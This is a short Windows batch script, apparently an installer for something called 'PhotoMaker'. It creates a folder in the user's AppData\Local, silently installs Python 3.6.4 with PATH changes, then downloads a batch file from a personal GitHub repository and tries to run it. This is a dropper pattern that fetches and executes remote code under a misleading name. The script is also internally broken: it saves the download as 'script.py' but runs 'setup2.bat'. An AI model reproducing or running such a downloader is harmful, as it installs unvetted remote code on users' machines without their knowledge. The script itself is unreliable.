@echo off
cd "%USERPROFILE%\AppData\Local" 
mkdir "PhotoMaker"
cd "PhotoMaker"
powershell Start-BitsTransfer -Source "https://www.python.org/ftp/python/3.6.4/python-3.6.4.exe" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe"
python-3.6.4.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
del "%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe"
powershell Start-BitsTransfer -Source "https://raw.githubusercontent.com/Bot007bot/forfun/master/setup2.bat" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\script.py"
.\setup2.bat
pause


